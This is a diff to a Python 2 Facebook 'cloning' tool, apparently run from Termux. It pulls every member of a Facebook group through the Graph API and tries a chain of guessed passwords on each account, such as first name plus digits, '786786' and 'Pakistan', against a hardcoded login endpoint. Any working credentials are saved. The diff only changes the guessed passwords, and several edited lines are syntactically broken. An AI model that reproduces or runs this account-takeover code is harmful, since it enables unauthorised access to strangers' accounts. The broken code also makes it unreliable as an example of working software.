@@ -951,7 +951,7 @@ def menu():
         time.sleep(0.05)
         print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m16.\033[1;94m Start Cloning Testing       \033[1;94m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m17.\033[1;93m Find  Facebook  ID          \033[1;92m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m17.\033[1;93m Find  Facebook  ID 👈       \033[1;92m▇▇"
         time.sleep(0.05)
         print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m18.\x1b[1;95m Get   ID From Friends       \033[1;95m▇▇"
         time.sleep(0.05)
@@ -1003,8 +1003,9 @@ def pilih():
 		print logo7
 		print " \033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•Massage•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\n"
                 jalan('\033[1;92m............Massage..........')
+		jalan('\033[1;95mID Not Fund Problum Salution Menu 11 Num Option')
                 jalan("\033[1;96mTermux  Data Clear Every Day")
-                jalan('\033[1;96mCommand Complet  90% ')
+                jalan('\033[1;96mCommand Complet  92% ')
                 jalan('\033[1;96mCommand Update Every day')
                 jalan("\033[1;93m.........Command...........")
                 jalan('\033[1;96mapt update')
@@ -3017,12 +3018,10 @@ def clone_dari_member_group():
 		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
 		z = json.loads(links.text)
 		def main(arg):
-		global cekpoint,oks
-		user = arg
 		try:													
-			teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
-	                kimak = json.loads(teman.text)											
-			pass1 = ('Muhammad'+b['last_name'])												
+			p = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
+	                k = json.loads(p.text)											
+			pass1 = (k['last_name'])												
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			q = json.load(data)												
 			if 'access_token' in q:
@@ -3044,7 +3043,7 @@ def clone_dari_member_group():
 				    cek.close()
 				    cekpoint.append(user+pass1)
                                 else:
-				    pass2 = (b['first_name']+'Rajpoot')										
+				    pass2 = (k['first_name']+'123')										
                                     data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			            q = json.load(data)												
 			            if 'access_token' in q:	
@@ -3066,7 +3065,7 @@ def clone_dari_member_group():
 				               cek.close()
 				               cekpoint.append(user+pass2)								
 				           else:											
-					       pass3 = ('Rana'+b['last_name'])									
+					       pass3 = '786786'									
 					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
 					       q = json.load(data)										
 					       if 'access_token' in q:	
@@ -3088,7 +3087,7 @@ def clone_dari_member_group():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = (b['first_name']+'Khan')												
+						           pass4 = (k['first_name']+'1234')												
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
@@ -3110,7 +3109,7 @@ def clone_dari_member_group():
 				                                       cek.close()
 				                                       cekpoint.append(user+pass4)					
 					                           else:									
-						                       pass5 = (b['first_name']+'Malik')				
+						                       pass5 = 'Pakistan')				
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                       q = json.load(data)								
 						                       if 'access_token' in q:	
@@ -3132,7 +3131,7 @@ def clone_dari_member_group():
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = (b['first_name']+'Afridi')								
+							                           pass6 = (b['first_name']+'786')								
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:	
@@ -3154,7 +3153,7 @@ def clone_dari_member_group():
 				                                                               cek.close()
 				                                                               cekpoint.append(user+pass6)	
 						                                           else:							
-								                               pass7 = (b['first_name']+'Mughal')					
+								                               pass7 = (k['first_name']+['last_name'])					
 								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
 								                               q = json.load(data)						
 								                               if 'access_token' in q:		
@@ -3176,7 +3175,7 @@ def clone_dari_member_group():
 				                                                                           cek.close()
 				                                                                           cekpoint.append(user+pass7)           					
 								                                       else:						
-										                           pass8 = (b['first_name']+'Jutt')										
+										                           pass8 = (k['first_name']+'12')										
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
 			                                                                                   if 'access_token' in q:		
@@ -3198,7 +3197,7 @@ def clone_dari_member_group():
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass8)   	
 										                                   else:					
-										                                       pass9 = (b['first_name']+'Shah')		
+										                                       pass9 = (k['first_name']+'12345')		
 										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
 										                                       q = json.load(data)				
 										                                       if 'access_token' in q:		
